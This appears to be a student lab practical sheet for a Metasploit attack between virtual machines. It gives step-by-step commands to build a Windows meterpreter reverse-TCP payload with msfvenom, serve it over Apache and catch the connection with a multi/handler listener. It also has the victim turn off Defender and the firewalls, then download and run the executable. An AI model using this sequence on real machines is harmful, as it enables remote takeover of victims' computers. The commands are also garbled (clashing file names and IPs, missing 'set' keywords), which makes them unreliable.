Practical No 10
Aim: To perform screenshare attack using Metasploit 

Step 1: Open Kali Linux terminal. 
Step 2: Right click and open Terminal
Step 3: Find the our system’s IP address using ifconfig. 
Step 4: Type "sudo su abd "enter the password : kali (by default kali linux has password as kali) 
Step 5: To create the malicious payload that will connect back to the attacker machine. 
Run command :- msfvenom -p windows/meterpreter/reverse_tcpLHOST=192.168.235.128 LPORT=123 -f exe -o C4.exe 
Make sure LHOST is your Ip address from Step 3 

Step 6:-Type ls for checking that payload is exist or not 
➔ Move the generated payload to /var/www/html directory. 
Command:-mv payload.exe /var/www/html 
➔Start Apache Web Server 
Command:-service apache2 start

Step 7:- Open New Tab In The Terminal 
➔ Start Metasploit Framework using 
Command:-sudo msfconsole.

Step 8:- Use the module➔Command:- exploit/multi/handler 
Set the payload ➔ Command:-windows/meterpreter/reverse_tcp. 
To Set LHOST to your our system’s IP and LPORT to the chosen port commad:- 
set LHOST 192.168.153.131 (NOTE:- IP Address in Step 3)

Step 9:- 
Then open Another virtual machine and Go to setting➔Virus and Threat Protection➔ Off 
all the firewalls 
Then in chrome type this 192.168.153.131/payload.exe(Note that IP address should the 
same as you mention in Step3) 

Step 10:-After running this you will see the file is downloading

Step 11:- Go to downloads and open the payload file 
➔Then go to kali linux virtual machine we have get the access of the another virtual 
machine 

Step 12:- To check the access of the victim machine run the following command 
➔sysinfo

If the command runs that means your have successfully get access (hacked) of that 
victims system

Step 13:-At the end go to 1st window of terminal and stop the apache2 server by 
following command 
➔service apache2 stop 

Step 14:-For exiting from that hacked system type exit till the terminal close.(same for 
2nd window of the terminal)
